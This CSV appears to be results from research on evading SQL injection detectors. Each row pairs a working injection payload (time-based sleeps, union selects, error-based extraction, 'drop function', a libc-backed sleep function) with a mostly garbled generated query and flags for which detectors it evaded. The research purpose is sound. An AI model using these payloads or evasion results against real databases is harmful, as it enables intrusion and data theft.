,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
105,1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,SELECT 6276 FROM SQL injection (SELECT 6276 FROM information_schema.character_sets) AS _end) FROM SQL_inject,1,1,1,1,1,1,1
106,"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",SELECT MIN(select) FROM SQL injection detection WHERE NOT SQL_injection_method_code ='sq injection',0,0,0,1,1,1,0
107,"1;select count(*) from generate_series(1,5000000)-- gqkk","SELECT MIN(*) FROM generate_series(1,5000000)-- gqkk) FROM SQL injection",1,1,0,0,0,0,0
108,"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'","SELECT MIN(select) FROM SQL injection_deficite, SUM(select) FROM SQL_injection WHERE 6400 = 6400 AND row(6237,7469) >(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL JOIN (SELECT MIN(select) FROM SELECT SUM(select) FROM SELECT SQL_injection) FROM SELECT SUM(select, SQL_injection) FROM SELECT &SQMz) FROM 7831 union select 3785",0,1,0,0,1,0,0
109,-3938%'))) or 2034=7209#,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM query: -3938%') ORDER BY MIN(23 = 7209#),0,1,0,0,1,0,0
110,"1%')) union all select null,null,null#","SELECT DISTINCT null,null,null# FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(sql injection detection) FROM query: 1%')",1,1,0,0,1,0,0
111,1) where 5866=5866 and 4595=4595#,SELECT * FROM query: 1 WHERE NOT SQL_inject = '5866=5866' AND 4595 = 4595#',0,1,0,0,0,0,0
112,1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,SELECT DISTINCT eject(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
113,"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))","SELECT (SELECT (SELECT case FROM SQL injection) AS _sysusers as sys1,sysusers as sys4,sysusers as sysusers as sys7*(select) FROM SELECT SQL_injection) FROM SELECT SQL_injection) FROM SELECT SQL_injection",0,1,0,0,0,0,0
114,-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,SELECT tezf FROM SQL_inaddr WHERE NOT tezf = 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr(113)||chr(select_inaddr.xr(4493 ='sql')',1,1,0,0,1,0,0
115,1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,SELECT MIN(select) FROM SQL injection_description WHERE NOT SQL_injection_method_code = '8288=8288',0,1,0,0,1,0,0
116,1));begin user_lock.sleep(5); end and ((6874=6874,"SELECT end,(6874 = 6874 FROM SQL_lock.sleep(5); end and ((6874 = 6874) FROM query: SELECT query: 1) FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0 FROM query: SELECT query: 0",1,1,0,0,1,0,0
117,"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",SELECT MIN(select case) FROM SQL injection detection WHERE 5903 = '5290=5290' ORDER BY 5903 DESC LIMIT 1,0,1,0,0,0,0,0
118,"1%"") or elt(5873=5873,sleep(5))#",SELECT MIN(sleep(5))# FROM SQL injection_detect_engineering,0,1,0,0,1,0,0
119,"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",SELECT DISTINCT ((*) FROM SQL_Injection),1,1,0,0,1,0,0
120,"1""))) and 7533=7533 and (((""alvd"" like ""alvd","SELECT DISTINCT ""alvd"" FROM SQL injection detection",1,0,1,1,1,1,1
121,"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL injection detection WHERE 5929 = 5929 = 5929 OR 5286 = (SELECT created FROM SQL_INNER JOIN All_users T1,all_users t2,all_users t3,all_users t5)--",1,1,0,0,0,0,0
122,1'));(select * from (select(sleep(5)))acdk)#,SELECT * FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
123,"1') as ildf where 5545=5545 union all select null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(sql) FROM SELECT SELECT MIN(,1,0,1,0,1,1,0
124,' or '1' = '1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
125,"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",SELECT * FROM SQL_injection_details WHERE NOT md5(0x4b774c75) = '6800=6800',1,1,0,0,1,0,0
126,1%');if(7899=7899) select 7899 else drop function zbbp--,SELECT 7899 = 7899 AND NOT SQL injection detection.sql_inject_replacement ='sql injection detection',1,1,1,1,0,1,0
127,1' where 3188=3188 and 9198=9198--,SELECT MIN(sql injection) FROM SQL_injection WHERE 3188 = 3188 AND 9198 = 9198--,1,1,0,0,0,0,0
128,"-4954%"") or 5244=4832",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -4954% OR 5244 = 4832,1,1,0,1,1,1,0
129,1'))) and 3602=1990#,SELECT MIN(3602 = 1990#) FROM SQL injection,1,1,0,0,1,0,0
130,"-7142')) union all select 5083,5083,5083,5083#","SELECT MIN(5083,5083,5083#) FROM SQL injection detection WHERE NOT SELECT MIN(5083,5083,5083#) FROM Query: -7142')",0,1,1,0,1,1,0
131,"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--","SELECT MIN(SQL) FROM SQL SELECT 2977,2977,2977,2977,2977-- FROM SQL_Injection WHERE NOT SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SQL",1,1,1,1,1,1,1
132,"-9532)) union all select 6039,6039,6039,6039--","SELECT MIN(6039,6039,6039--) FROM SQL injection_description",1,1,1,1,0,1,0
133,1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,SELECT MIN(end--) FROM SQL injection detection WHERE NOT SELECT 'wvqj' FROM SQL_Injection',0,1,1,1,1,1,1
134,"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT MIN(repeat(right(right(5012),0 FROM SQL injection detection) FROM query: 1% AND never anexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(59)|char(79)|char(5000000000000),'sql)'",1,1,0,0,1,0,0
135,"1') where 3476=3476 and elt(1210=1210,sleep(5))--",SELECT MIN(sleep(5))-- SELECT MIN(sleep(5)) FROM SQL injection detection,1,1,0,0,1,0,0
136,"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",SELECT DISTINCT t2.(t1.nuil) FROM 'SQL injection' AS t1 JOIN query: 1') AND t1.chr(76)||chr(65) = dbms_pipe.receive_message(chr(76)||chr(65),0,1,0,0,0,0,0
137,-9100) or 8792=9550--,SELECT * FROM query: 8792 = 9550-- FROM query: 8792 = 962 FROM SQL_Injector WHERE NOT SQL_inject = 'valid',1,1,1,1,1,1,1
138,"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection detection WHERE NOT ix7171706a71 = ""SQL""",0,1,0,0,1,0,0
139,"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270","SELECT MIN(select) FROM SQL injection_deficite, SELECT elt(1297 = 1297,1) FROM SQL_Injection_Procedures WHERE NOT elt(1297 = 1297",0,1,0,0,1,0,0
140,"1' in boolean mode);select count(*) from generate_series(1,5000000)#","SELECT COUNT(*) FROM query_series(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
141,1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,SELECT DISTINCT t1.rzwb' = 'rzwb' AND NOT t1.sq injection ='sq injection',1,1,1,0,0,0,0
142,"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon","SELECT DISTINCT elt(1032 = 1032,3623) FROM SQL injection detection",1,1,0,0,1,0,0
143,"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--","SELECT MIN(sql injection) FROM SQL_injection WHERE 8218 = 8218 OR make_set(4954 = 1836,1836)--",0,1,0,0,0,0,0
144,"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))","SELECT MIN(select) FROM SQL injection detection WHERE NOT SQL_injection = ""Date""",0,0,0,0,1,0,0
145,"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""","SELECT DISTINCT % FROM table_exp_substring(repeat(left(crypt_key)||char(69) FROM SQL injection detection WHERE NOT null_injection = ""evade""",1,1,0,0,1,0,0
146,"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""","SELECT * FROM SQL_injection, SELECT SUM(select count(*) FROM SQL_injection) FROM rdb$fields as T1 JOIN t2,rdb$collations as T3,rdb$functions as T4) and (((((((((((((((((((((((((((((((((((((((((((((((select) FROM SQL injection detection) or SELECT SUM(select count(*) FROM rdb$functions as t1) FROM SQL_injection) AS t2 ON T1.rdb$functions as T3 - Query: 1%"") FROM rdb$functions as T3)",1,1,0,0,0,0,0
147,1%' or (select * from (select(sleep(5)))sddo)#,SELECT DISTINCT select(sleep(5))sddo) FROM SQL injections EXCEPT SELECT DISTINCT SUM(select(select(select(sleep(5))) FROM query: 'SQ injection detection',1,1,0,0,1,0,0
148,1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(select (sql) FROM SELECT & t1.chr(4386 = 4386 ='sql injection',0,1,0,0,0,0,0
149,1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,SELECT 4240 FROM pg_sleep(5),1,1,0,1,1,1,0
150,"1') and 3824=benchmark(5000000,md5(0x76555642))",SELECT MIN(0x76555642) FROM SQL injections,1,1,1,1,1,1,1
151,"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
152,"-3963"" or 1224=5119","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT Query: -3963"" OR 1224 = 5119",1,1,1,1,1,1,1
153,1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,"SELECT MIN(select) FROM SQL injection AS _executor_select WHERE (select_schema.character_sets) = ""3633 = 3633;select""",0,1,0,0,0,0,0
154,-1354)) or 8571=8571--,SELECT * FROM query: -1354) ORDER BY query: -1354 = 8571 = 8571,1,1,0,0,0,0,0
155,"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","SELECT * FROM SQL_injection, SELECT * FROM (SELECT * FROM (SELECT * FROM *///////////////////////////////////////////////////////////////////////////////////////))",0,1,0,1,0,0,0
156,"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",SELECT MIN(6055 = 6055) FROM SQL injection detection WHERE 5748 = 5748 AND 6055 = ctxsys.drith(6055)|chr(6055)|chr(6055)|chr(6055) FROM SQL SELECT MIN(6055 = 6055) FROM SQL SELECT MIN(6055 = 6055) FROM SQL SELECT MIN(6055 = 6055) FROM ctxsys.drith(6055 = 5748 = 5748 = 5748 = 5748 AND 6055 = ctxsys.drith(112)|chr(6055 = 5858,1,1,0,0,0,0,0
157,"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#","SELECT MIN(*) FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,domain.tables"" AND NOT domain.domain.tables = ""8514""",1,1,0,0,0,0,0
158,"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'","SELECT MIN(select) FROM SQL injection detection WHERE 6268 = 6268 AND 3707 = ""select count(*)""",0,1,0,0,1,0,0
159,"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL_injection WHERE NOT rdb$types as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,1,0,1,0,0,0
160,"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",SELECT DISTINCT case FROM (SELECT SUM(repeat(left(crypt_key)||char(69) FROM SQL injection) AS  FROM SQL_injection),0,1,0,0,1,0,0
161,"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_inject JOIN (SELECT MIN(select) FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL)),0,0,0,0,1,0,0
162,"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
163,"-7324) or make_set(8486=6544,6544)","SELECT * FROM query: -7324) ORDER BY query(8486 = 6544,6544)",1,1,0,0,1,0,0
164,"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","SELECT MIN(select) FROM SQL_injection WHERE esp_injected_diagnosis = '7107=7107' ORDER BY elt(6270 = 6270,1)",0,1,0,0,1,0,0
165,"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw","SELECT MIN(select count(*) FROM SQL injection detection) FROM sysusers as sys1,sysusers as sys4,sysusers as sys4,sysusers as sys7# kkmw""",1,1,0,0,0,0,0
166,1 and 6969=(select 6969 from pg_sleep(5))-- yczq,SELECT 6969 FROM pg_sleep(5))-- yczq FROM SQL injection,1,1,0,0,1,0,0
167,"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
168,"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",SELECT MIN(7259) FROM SQL injection detection,1,0,0,1,1,1,0
169,"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",SELECT 1928 ='sql injection detection',1,0,1,1,1,1,1
170,"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip","SELECT fkip FROM SQL injection_detect_engineer WHERE NOT SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT & 4241 = convert(int,(select) FROM query: 1"")",0,1,0,0,1,0,0
171,"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT jQuery: 1"") AND query(hex(randomblob(500000000000/2) = 'abcdefg'",1,1,0,0,1,0,0
172,"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",SELECT DISTINCT 'qtfl' FROM SQL injection',1,1,1,1,1,1,1
173,"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
174,"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",SELECT MIN(5023 = ctxsys.drithsx.sn(5023 = ctxxsys.drith(5023)|chr(5023) FROM SQL injections),1,1,0,0,1,0,0
175,"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",SELECT COUNT(*) FROM SQL_users WHERE NOT all_users IN (SELECT all_users FROM SQL injection detection),1,1,1,1,1,1,1
176,"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT NOT SQL_inject_message FROM query: 1 WHERE 9279 = 9279 OR 7427 = dbms_pipe.receive_message(chr(87)||chr(109),1,1,0,0,1,0,0
177,"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",SELECT MIN(select) FROM SQL injection_deficite',0,0,0,0,1,0,0
178,"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
179,"1'))) union all select null,null,null--","SELECT null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM query: 1'))",1,1,0,0,1,0,0
180,"-4319"") where 7534=7534 or 8246=3217",SELECT MIN(sql injection) FROM SQL SELECT MIN(7534 = 7534 = 7534 OR 8246 = 3217,1,1,0,0,0,0,0
181,"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","SELECT NOT SQL_-- FROM query: 1) WHERE 9724 = 9724 = 9724 = 9724 OR NOT char(68)||char(85) = regexp_substring(repeat(right(5389),5000000000) FROM SQL_substring(repeat(right(right(right)",1,1,0,0,1,0,0
182,1'));begin user_lock.sleep(5); end--,SELECT MIN(end_-) FROM SQL_injection WHERE NOT SELECT user_lock.sleep(5); end--,0,1,1,0,0,0,0
183,"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",SELECT MIN(select) FROM SQL injection_deficite',0,0,0,0,1,0,0
184,"1%') union all select null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
185,"-8929%') union all select 9486,9486,9486,9486#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 9486,9486,9486 = 9486",1,1,1,1,0,1,0
186,"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
187,"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",SELECT MIN(select) FROM SQL injection detection WHERE'sequence = 3582 = 3582' OR 4144 = 4144 =(select upper(xmltype(chr(113)||chr(113)||chr(106)||chr(62)) FROM SQL_injection,0,1,0,0,0,0,0
188,"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",SELECT 'xzcr' FROM RESULT SELECT t1.repeat(left(crypt_key)||char(88) FROMregexp_substring(repeat(repeat(sql)' FROM table_regexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sql)'),1,1,0,0,1,0,0
